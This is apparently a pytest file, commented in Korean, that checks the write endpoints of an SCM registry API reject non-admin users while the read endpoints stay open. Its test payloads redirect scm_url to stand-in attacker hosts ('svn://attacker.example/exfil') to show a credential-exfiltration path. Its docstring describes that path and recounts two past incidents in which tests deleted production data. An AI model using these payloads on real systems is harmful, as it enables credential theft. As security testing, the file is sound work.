"""SCM registry **쓰기**는 admin 전용 — 읽기는 개방 (사용자 결정, 2026-08-04).

## 실측한 것 (라이브 요청으로 재현, tmp 사본 대상 — 저장소 registry 무변조)

`backend/routers/scm.py` 에 `require_admin`·`Depends` 가 **0건**이었다. 형제 evidence
라우터(swut/swit/swsa/swreport/quality)는 전부 라우터 레벨 admin 인데 scm 만 빠져 있었고,
의도된 예외가 아니다 — `git log -S require_admin -- backend/routers/scm.py` 이력이 전무하고,
의도적 비게이트인 file-mode 는 `health.py:233-239` 에 사유 주석이 있는데 여기엔 없다.

비관리자 헤더 하나로 재현된 것:

    POST   /api/scm/register        -> 200, entry 생성 + cloudium 읽기 경계 라이브 확장
    PUT    /api/scm/update/{id}     -> 200, scm_url·scm_username·scm_password_env 변조
    POST   /api/scm/{id}/link-docs  -> 200, 연결문서 전면 교체(나머지 필드 공란화)
    DELETE /api/scm/delete/{id}     -> 200, entry 삭제
    POST   /api/scm/test/{id}       -> 200, **공격자 URL 로 아웃바운드** svn info

`update` 가 특히 크다: `scm_url` 재지정 + `scm_password_env` 유지는
`resolve_scm_credentials`(Jenkins sync·impact_orchestrator 소비)를 통해
**`DEVOPS_SCM_PASSWORD` 가 설정되는 순간 자격 유출로 활성화**되는 잠복 경로다.

## 읽기를 왜 안 잠그는가

형제 라우터와 달리 scm 읽기는 UI 전반에 배선돼 있다 — Dashboard·projectLoader·DocGen·
SrsSds·ProjectSummary·Analysis·ImpactGuide 가 앱 초기 로드에 `GET /api/scm/list` 를 부른다.
라우터 통짜 게이트는 비관리자 사용자가 생기는 순간 조회 화면을 통째로 깨뜨린다.
오늘 등록 사용자가 1명(admin)뿐이라 파손이 0인 건 **잠글 이유**이지 통짜로 잠글 이유가 아니다.
"""
from __future__ import annotations

import pytest

pytest.importorskip("fastapi")

WRITE_CALLS = [
    ("post", "/api/scm/register",
     {"id": "pwn", "name": "pwn", "scm_type": "svn",
      "scm_url": "svn://attacker.example/evil", "source_root": "C:/Windows/System32"}),
    ("put", "/api/scm/update/hdpdm01", {"scm_url": "svn://attacker.example/exfil"}),
    ("delete", "/api/scm/delete/hdpdm01", None),
    ("post", "/api/scm/hdpdm01/link-docs", {"uds": "C:/tmp/evil.docx"}),
    ("post", "/api/scm/test/pwn", None),
]

READ_CALLS = [
    ("get", "/api/scm/list"),
    ("get", "/api/scm/status/hdpdm01"),
    ("get", "/api/scm/audit/hdpdm01"),
    ("get", "/api/scm/change-history/hdpdm01"),
    ("get", "/api/scm/build-timeline/hdpdm01"),
]


def _live_registry_path():
    from pathlib import Path

    from backend.services import scm_registry as sr

    return Path(sr.__file__).resolve().parents[2] / "config" / "scm_registry.json"


@pytest.fixture(autouse=True)
def _registry_must_not_change():
    """**안전망** — 이 파일의 어떤 테스트도 운영 registry 를 바꾸지 못한다.

    ⚠ 이 픽스처는 사고 **두 번** 뒤에 생겼다.
      ① admin 대조군이 라이브 앱에 진짜 요청을 보내 `DELETE /api/scm/delete/hdpdm01` 이
         **운영 registry 엔트리를 실제로 지웠다**(커밋본에서 복원).
      ② 그래서 경로 격리 픽스처를 넣었는데, **그 픽스처를 무력화하는 뮤테이션**을 돌리는
         동안 같은 삭제 + `pwn`/`isolation-probe` 유입이 또 일어났다(스냅샷에서 복원).

      교훈은 하나다: **게이트를 검증하려고 게이트 뒤의 부작용을 실행하지 마라.**
      아래 `_no_side_effects` 가 부작용 자체를 없애고, 이 픽스처는 그게 뚫려도
      파일이 남지 않게 하는 마지막 방어선이다(그리고 뚫렸다는 사실을 실패로 알린다).
    """
    live = _live_registry_path()
    before = live.read_bytes() if live.exists() else None
    try:
        yield
    finally:
        after = live.read_bytes() if live.exists() else None
        if before != after:
            if before is None:
                live.unlink(missing_ok=True)
            else:
                live.write_bytes(before)
            pytest.fail(
                "이 파일의 테스트가 운영 config/scm_registry.json 을 변경했다 — 복원했지만 "
                "부작용이 실행되고 있다는 뜻이므로 즉시 고칠 것"
            )


@pytest.fixture
def no_side_effects(monkeypatch):
    """쓰기 handler 의 **부작용 함수를 통째로 스텁**한다.

    권한 계층 테스트가 알아야 할 것은 "게이트를 통과했는가" 뿐이다. 통과 뒤 registry 를
    실제로 쓰고 지우고 외부 SVN 에 접속할 이유가 없다 — 그 실행이 위 사고 둘의 원인이다.
    """
    from backend.routers import scm as scm_router

    calls: list[str] = []

    def _stub(name):
        def _inner(*_a, **_k):
            calls.append(name)
            return {"id": "stub", "name": "stub"}
        return _inner

    for fn in ("register_entry", "update_entry", "delete_entry", "replace_linked_docs"):
        if hasattr(scm_router, fn):
            monkeypatch.setattr(scm_router, fn, _stub(fn))
    # `test/{id}` 의 아웃바운드(svn info)도 막는다 — 임의 URL 로 나가면 안 된다.
    if hasattr(scm_router, "svn_info_url"):
        monkeypatch.setattr(scm_router, "svn_info_url", _stub("svn_info_url"))
    return calls


@pytest.fixture
def client():
    from fastapi.testclient import TestClient

    from backend.main import app

    return TestClient(app, raise_server_exceptions=False)


NON_ADMIN = {"X-User": "nobody_not_admin_zzz"}
ADMIN = {"X-User": "tester"}          # conftest 가 admin 으로 등록


class TestWritesAreAdminOnly:
    @pytest.mark.parametrize(("method", "path", "body"), WRITE_CALLS)
    def test_non_admin_is_rejected(self, client, method, path, body):
        kwargs = {"headers": NON_ADMIN}
        if body is not None:
            kwargs["json"] = body
        res = getattr(client, method)(path, **kwargs)
        assert res.status_code in (401, 403), (
            f"{method.upper()} {path} 가 비관리자에게 {res.status_code} 를 냈다 — "
            "registry 변조·삭제·자격 재지정·아웃바운드가 열려 있다"
        )

    @pytest.mark.parametrize(("method", "path", "body"), WRITE_CALLS)
    def test_admin_is_not_blocked_by_the_gate(self, client, no_side_effects, method, path, body):
        """대조군 — 게이트가 admin 까지 막으면 기능이 죽은 것이다.

        ⚠ `no_side_effects` 가 **필수**다. 이 요청들은 게이트를 통과하면 그 뒤 registry
          쓰기·삭제·외부 SVN 접속까지 실행된다 — 실제로 운영 엔트리가 지워진 사고가
          **두 번** 있었다. 권한 계층 테스트는 상태를 바꿀 이유가 없다.

        ⚠ 게이트 **통과**만 본다. 그 뒤 결과(404/422/200)는 이 파일의 관심사가 아니다.
        """
        kwargs = {"headers": ADMIN}
        if body is not None:
            kwargs["json"] = body
        res = getattr(client, method)(path, **kwargs)
        assert res.status_code not in (401, 403), (
            f"{method.upper()} {path} 가 admin 에게도 {res.status_code} 다 — 게이트가 과잉이다"
        )

    def test_side_effects_are_actually_stubbed(self, client, no_side_effects):
        """스텁이 진짜 걸렸는지 — 안 걸리면 위 대조군이 운영 상태를 건드린다.

        ⚠ 라우터가 함수를 다른 이름으로 import 하거나 지역에서 다시 가져오면 monkeypatch 가
          조용히 빗나간다. 그래서 **스텁이 호출됐다는 사실**을 값으로 확인한다.
          (파일이 안 바뀌는 것만 보면 "요청이 422 로 죽어서" 도 통과한다 — 공허 통과.)
        """
        res = client.post(
            "/api/scm/register",
            json={"id": "stub-probe", "name": "stub probe", "scm_type": "svn",
                  "scm_url": "svn://example/none", "source_root": "."},
            headers=ADMIN,
        )
        assert res.status_code not in (401, 403), res.text
        assert "register_entry" in no_side_effects, (
            f"스텁이 호출되지 않았다(status={res.status_code}) — 실제 registry 쓰기가 "
            "실행됐거나 요청이 그 전에 죽었다. 둘 다 이 대조군을 공허하게 만든다"
        )


class TestReadsStayOpen:
    """사용자 결정 — 앱 초기 로드가 이 조회들에 의존한다."""

    @pytest.mark.parametrize(("method", "path"), READ_CALLS)
    def test_non_admin_can_still_read(self, client, method, path):
        res = getattr(client, method)(path, headers=NON_ADMIN)
        assert res.status_code != 403, (
            f"{method.upper()} {path} 가 비관리자에게 403 이다 — 라우터 통짜 게이트가 "
            "들어갔다면 Dashboard·문서생성·요구커버리지 조회가 통째로 깨진다"
        )


class TestGateIsDeclaredOnTheDecorator:
    """배선을 소스에서도 고정 — 라우트가 추가·이동돼도 누락을 잡는다."""

    @pytest.fixture(scope="class")
    def source(self):
        from pathlib import Path

        import backend.routers.scm as scm

        return Path(scm.__file__).read_text(encoding="utf-8")

    @pytest.mark.parametrize(
        "decorator",
        [
            '@router.post("/api/scm/register", dependencies=[Depends(require_admin)])',
            '@router.put("/api/scm/update/{entry_id}", dependencies=[Depends(require_admin)])',
            '@router.delete("/api/scm/delete/{entry_id}", dependencies=[Depends(require_admin)])',
            '@router.post("/api/scm/{entry_id}/link-docs", dependencies=[Depends(require_admin)])',
            '@router.post("/api/scm/test/{entry_id}", dependencies=[Depends(require_admin)])',
        ],
    )
    def test_write_decorator_carries_the_gate(self, source, decorator):
        assert decorator in source

    def test_reason_for_open_reads_is_documented(self, source):
        """왜 읽기가 열려 있는지 코드가 말해야 한다 — 없으면 다음 사람이 '누락' 으로 읽고 잠근다."""
        assert "읽기(list/status/audit/change-history/impact-job/build-timeline)는 잠그지 않는다" in source
        assert "사용자 결정" in source
